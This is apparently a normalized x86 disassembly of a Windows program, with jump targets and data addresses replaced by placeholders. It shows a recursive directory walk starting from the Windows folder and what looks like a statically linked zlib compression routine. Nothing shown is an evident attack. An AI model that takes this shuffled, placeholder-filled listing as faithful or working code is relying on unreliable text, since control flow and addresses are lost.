sub_404e0e
push ebp
mov ebp esp
sub esp 0x640
push esi
push edi
lea eax [ ebp - 0x240 ]
push 0x100
push eax
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x23d ]
push rw-data
push eax
call strcpy
mov esi [ sprintf@IAT ]
lea eax [ ebp - 0x240 ]
push eax
lea eax [ ebp - 0x440 ]
push rw-data
push eax
call esi
add esp 0x14
lea eax [ ebp - 0x140 ]
push eax
lea eax [ ebp - 0x440 ]
push eax
call [ FindFirstFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
pop edi
pop esi
leave
retn
lea eax [ ebp - 0x140 ]
push eax
push edi
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
push edi
call [ FindClose@IAT ]
cmp [ ebp - 0x114 ] 0x2e
je r-xdata
test [ ebp - 0x140 ] 0x10
je r-xdata
lea eax [ ebp - 0x114 ]
push rw-data
push eax
lea eax [ ebp - 0x240 ]
push eax
lea eax [ ebp - 0x640 ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x640 ]
push eax
call sub_404ed6
add esp 0x18
jmp r-xdata
sub_404ed6
push ebp
mov ebp esp
sub esp 0x540
push esi
mov esi [ sprintf@IAT ]
push edi
lea eax [ ebp - 0x540 ]
push [ ebp + 0x8 ]
push rw-data
push eax
call esi
add esp 0xc
lea eax [ ebp - 0x140 ]
push eax
lea eax [ ebp - 0x540 ]
push eax
call [ FindFirstFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
push 0x1
pop eax
lea eax [ ebp - 0x140 ]
push eax
push edi
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
push edi
call [ FindClose@IAT ]
cmp [ ebp - 0x114 ] 0x2e
je r-xdata
lea eax [ ebp - 0x114 ]
push eax
lea eax [ ebp - 0x340 ]
push [ ebp + 0x8 ]
push rw-data
push eax
call esi
add esp 0x10
test [ ebp - 0x140 ] 0x10
je r-xdata
lea eax [ ebp - 0x114 ]
push eax
call sub_4023c5
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x340 ]
push eax
call sub_404ed6
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x340 ]
push eax
call sub_4027a1
pop ecx
jmp r-xdata
push edi
call [ FindClose@IAT ]
xor eax eax
jmp r-xdata
jmp r-xdata
pop edi
pop esi
leave
retn
sub_404fc0
push ebp
mov ebp esp
sub esp 0x40
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x3c ] eax
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x38 ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x30 ] edx
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov [ ebp - 0x2c ] ecx
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x2c ]
cmp eax [ edx ]
je r-xdata
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
push 0x38
push rw-data
mov ecx [ ebp + 0x18 ]
push ecx
lea edx [ ebp - 0x3c ]
push edx
call sub_4050b0
add esp 0x10
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0xfffffffb
jmp r-xdata
push 0x4
lea eax [ ebp - 0x3c ]
push eax
call sub_40574e
add esp 0x8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x28 ]
mov [ eax ] ecx
lea edx [ ebp - 0x3c ]
push edx
call sub_405be5
add esp 0x4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
lea ecx [ ebp - 0x3c ]
push ecx
call sub_405be5
add esp 0x4
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x40 ] 0xfffffffb
jmp r-xdata
mov eax [ ebp - 0x40 ]
jmp r-xdata
sub_405089
push ebp
mov ebp esp
push 0xffffffff
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_404fc0
add esp 0x14
pop ebp
retn
sub_4050b0
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
push 0x0
push 0x8
push 0xf
push 0x8
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_4050d5
add esp 0x20
pop ebp
retn
sub_4050d5
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0xc ] 0x0
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov eax 0xfffffffa
jmp r-xdata
mov eax [ ebp + 0x20 ]
movsx ecx [ eax ]
mov edx [ rw-data ]
movsx eax [ edx ]
cmp ecx eax
jne r-xdata
mov esp ebp
pop ebp
retn
cmp [ ebp + 0x24 ] 0x38
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x18 ] 0x0
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x20 ] 0x0
jne r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] sub_4074de
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x28 ] 0x0
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24 ] sub_407507
cmp [ ebp + 0x14 ] 0x0
jge r-xdata
mov [ ebp + 0xc ] 0x6
cmp [ ebp + 0x18 ] 0x1
jl r-xdata
mov [ ebp - 0xc ] 0x1
mov ecx [ ebp + 0x14 ]
neg ecx
mov [ ebp + 0x14 ] ecx
mov eax 0xfffffffe
jmp r-xdata
cmp [ ebp + 0x18 ] 0x9
jg r-xdata
cmp [ ebp + 0x10 ] 0x8
jne r-xdata
cmp [ ebp + 0x14 ] 0x8
jl r-xdata
cmp [ ebp + 0x14 ] 0xf
jg r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
cmp [ ebp + 0xc ] 0x9
jg r-xdata
cmp [ ebp + 0x1c ] 0x0
jl r-xdata
cmp [ ebp + 0x1c ] 0x2
jle r-xdata
push 0x16b8
push 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x28 ]
push eax
mov ecx [ ebp + 0x8 ]
call [ ecx + 0x20 ]
add esp 0xc
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x1c ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ eax + 0x18 ] ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
mov [ edx + 0x28 ] eax
mov ecx [ ebp - 0x8 ]
mov edx 0x1
mov ecx [ ecx + 0x28 ]
shl edx cl
mov eax [ ebp - 0x8 ]
mov [ eax + 0x24 ] edx
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x24 ]
sub edx 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov ecx [ ebp + 0x18 ]
add ecx 0x7
mov edx [ ebp - 0x8 ]
mov [ edx + 0x48 ] ecx
mov eax [ ebp - 0x8 ]
mov edx 0x1
mov ecx [ eax + 0x48 ]
shl edx cl
mov eax [ ebp - 0x8 ]
mov [ eax + 0x44 ] edx
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x44 ]
sub edx 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4c ] edx
mov ecx [ ebp - 0x8 ]
mov eax [ ecx + 0x48 ]
add eax 0x2
xor edx edx
mov ecx 0x3
div ecx
mov edx [ ebp - 0x8 ]
mov [ edx + 0x50 ] eax
push 0x2
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x24 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x28 ]
push eax
mov ecx [ ebp + 0x8 ]
call [ ecx + 0x20 ]
add esp 0xc
mov edx [ ebp - 0x8 ]
mov [ edx + 0x30 ] eax
push 0x2
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x24 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x28 ]
push eax
mov ecx [ ebp + 0x8 ]
call [ ecx + 0x20 ]
add esp 0xc
mov edx [ ebp - 0x8 ]
mov [ edx + 0x38 ] eax
push 0x2
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x44 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x28 ]
push eax
mov ecx [ ebp + 0x8 ]
call [ ecx + 0x20 ]
add esp 0xc
mov edx [ ebp - 0x8 ]
mov [ edx + 0x3c ] eax
mov ecx [ ebp + 0x18 ]
add ecx 0x6
mov eax 0x1
shl eax cl
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x1694 ] eax
push 0x4
mov edx [ ebp - 0x8 ]
mov eax [ edx + 0x1694 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x28 ]
push edx
mov eax [ ebp + 0x8 ]
call [ eax + 0x20 ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] edx
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x1694 ]
shl ecx 0x2
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax 0xfffffffc
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ rw-data ]
mov [ ecx + 0x18 ] edx
mov eax [ ebp + 0x8 ]
push eax
call sub_405be5
add esp 0x4
mov eax 0xfffffffc
jmp r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ecx + 0x38 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
cmp [ edx + 0x3c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x1694 ]
shr edx 0x1
mov eax [ ebp - 0x4 ]
lea ecx [ eax + edx * 2 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x169c ] ecx
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x1694 ]
imul ecx ecx 0x3
mov edx [ ebp - 0x8 ]
mov eax [ edx + 0x8 ]
add eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x1690 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx + 0x7c ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x1c ]
mov [ ecx + 0x80 ] edx
mov eax [ ebp - 0x8 ]
mov cl [ ebp + 0x10 ]
mov [ eax + 0x1d ] cl
mov edx [ ebp + 0x8 ]
push edx
call sub_405561
add esp 0x4
sub_4053c1
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] 0x0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
cmp [ eax + 0x4 ] 0x2a
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x30 ]
push eax
call sub_407520
add esp 0xc
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x30 ] eax
cmp [ ebp - 0x8 ] 0x3
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x24 ]
sub eax 0x106
cmp [ ebp - 0x8 ] eax
jbe r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x30 ]
push edx
call memcpy
add esp 0xc
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x64 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x54 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x30 ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x40 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ edx + 0x40 ]
mov ecx [ eax + 0x50 ]
shl edx cl
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x30 ]
xor eax eax
mov al [ ecx + 0x1 ]
xor edx eax
mov ecx [ ebp - 0x4 ]
and edx [ ecx + 0x4c ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x40 ] edx
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x24 ]
sub edx 0x106
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0x10 ]
sub eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
add ecx eax
mov [ ebp + 0xc ] ecx
mov edx [ ebp - 0x8 ]
sub edx 0x3
cmp [ ebp - 0x10 ] edx
ja r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov edx [ eax + 0x40 ]
mov ecx [ ecx + 0x50 ]
shl edx cl
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
xor ebx ebx
mov bl [ ecx + eax + 0x2 ]
xor edx ebx
mov ecx [ ebp - 0x4 ]
and edx [ ecx + 0x4c ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x40 ] edx
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
xor eax eax
mov ax [ ecx + edx * 2 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
and edx [ ecx + 0x2c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x38 ]
mov ax [ ebp - 0xc ]
mov [ ecx + edx * 2 ] ax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov ax [ ebp - 0x10 ]
mov [ ecx + edx * 2 ] ax
jmp r-xdata
xor eax eax
mov [ ebp - 0xc ] 0x0
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
sub_405561
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x20 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x18 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x2c ] 0x2
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] 0x0
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x8 ]
mov [ ecx + 0x10 ] eax
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x18 ] 0x0
jge r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x18 ]
neg ecx
sbb ecx ecx
and ecx 0x47
add ecx 0x2a
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x30 ] 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x20 ] 0x0
mov edx [ ebp - 0x4 ]
push edx
call sub_4077a0
add esp 0x4
mov eax [ ebp - 0x4 ]
push eax
call sub_405f42
add esp 0x4
xor eax eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] 0x0
sub_405632
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x8 ] edx
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
mov [ ebp + 0xc ] 0x6
mov eax 0xfffffffe
jmp r-xdata
cmp [ ebp + 0xc ] 0x9
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
jl r-xdata
cmp [ ebp + 0x10 ] 0x2
jle r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x7c ]
imul ecx ecx 0xc
mov edx [ ecx + r--data ]
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0xc ]
imul eax eax 0xc
mov ecx [ ebp - 0xc ]
cmp ecx [ eax + r--data ]
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x7c ]
cmp edx [ ebp + 0xc ]
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x8 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x10 ]
mov [ edx + 0x80 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax + 0x7c ] ecx
mov edx [ ebp + 0xc ]
imul edx edx 0xc
xor eax eax
mov ax [ edx + r--data ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x78 ] eax
mov edx [ ebp + 0xc ]
imul edx edx 0xc
xor eax eax
mov ax [ edx + r--data ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x84 ] eax
mov edx [ ebp + 0xc ]
imul edx edx 0xc
xor eax eax
mov ax [ edx + r--data ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x88 ] eax
mov edx [ ebp + 0xc ]
imul edx edx 0xc
xor eax eax
mov ax [ edx + r--data ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x74 ] eax
push 0x1
mov eax [ ebp + 0x8 ]
push eax
call sub_40574e
add esp 0x8
mov [ ebp - 0x4 ] eax
sub_40574e
push ebp
mov ebp esp
sub esp 0x14
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
cmp [ ebp + 0xc ] 0x4
jg r-xdata
cmp [ ebp + 0xc ] 0x0
jge r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ rw-data ]
mov [ ecx + 0x18 ] edx
mov eax 0xfffffffe
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x29a
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x20 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
mov [ ecx + 0x20 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x2a
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ rw-data ]
mov [ ecx + 0x18 ] edx
mov eax 0xfffffffb
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x14 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x28 ]
sub edx 0x8
shl edx 0x4
add edx 0x8
shl edx 0x8
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x7c ]
sub ecx 0x1
sar ecx 0x1
mov [ ebp - 0x10 ] ecx
cmp [ ebp - 0x10 ] 0x3
jbe r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_405b20
add esp 0x4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0x10 ]
shl edx 0x6
mov eax [ ebp - 0xc ]
or eax edx
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x64 ] 0x0
je r-xdata
mov [ ebp - 0x10 ] 0x3
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x29a
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x20 ] 0xffffffff
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov ecx 0x1f
div ecx
mov eax 0x1f
sub eax edx
mov ecx [ ebp - 0xc ]
add ecx eax
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] 0x71
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
push ecx
call sub_405ad0
add esp 0x8
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x64 ] 0x0
je r-xdata
mov edx [ ebp - 0xc ]
or edx 0x20
mov [ ebp - 0xc ] edx
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x30 ] 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
shr ecx 0x10
push ecx
mov edx [ ebp - 0x4 ]
push edx
call sub_405ad0
add esp 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
and ecx 0xffff
push ecx
mov edx [ ebp - 0x4 ]
push edx
call sub_405ad0
add esp 0x8
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp - 0x4 ]
push edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x7c ]
imul ecx ecx 0xc
call [ ecx + r--data ]
add esp 0x8
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x2
je r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ edx + 0x18 ] eax
mov eax 0xfffffffb
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ rw-data ]
mov [ ecx + 0x18 ] edx
mov eax 0xfffffffb
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] 0x29a
cmp [ ebp - 0x14 ] 0x3
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x2
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x29a
je r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x20 ] 0xffffffff
cmp [ ebp - 0x14 ] 0x1
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x18 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x30 ]
shr eax 0x10
push eax
mov ecx [ ebp - 0x4 ]
push ecx
call sub_405ad0
add esp 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x30 ]
and eax 0xffff
push eax
mov ecx [ ebp - 0x4 ]
push ecx
call sub_405ad0
add esp 0x8
mov edx [ ebp + 0x8 ]
push edx
call sub_405b20
add esp 0x4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xffffffff
mov ecx [ ebp - 0x4 ]
xor eax eax
cmp [ ecx + 0x14 ] 0x0
sete al
mov eax 0x1
jmp r-xdata
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call sub_407904
add esp 0x10
cmp [ ebp + 0xc ] 0x3
jne r-xdata
mov edx [ ebp - 0x4 ]
push edx
call sub_407a43
add esp 0x4
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_405b20
add esp 0x4
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x44 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov [ ecx + edx * 2 - 0x2 ] 0x0
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x44 ]
lea ecx [ eax + eax - 0x2 ]
push ecx
push 0x0
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x3c ]
push eax
call memset
add esp 0xc
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0xffffffff
xor eax eax
jmp r-xdata
sub_405ad0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
shr eax 0x8
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x14 ]
mov [ edx + ecx ] al
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] eax
mov edx [ ebp + 0xc ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
pop ebp
retn
sub_405b20
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
mov edx [ ecx + 0x14 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
cmp ecx [ eax + 0x10 ]
jbe r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
mov ecx [ eax + 0x10 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc ]
push eax
call memcpy
add esp 0xc
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc ]
add edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov eax [ edx + 0x10 ]
add eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov [ edx + 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x10 ]
sub ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x10 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
mov edx [ ecx + 0x14 ]
sub edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
mov [ ecx + 0x14 ] edx
mov edx [ ebp + 0x8 ]
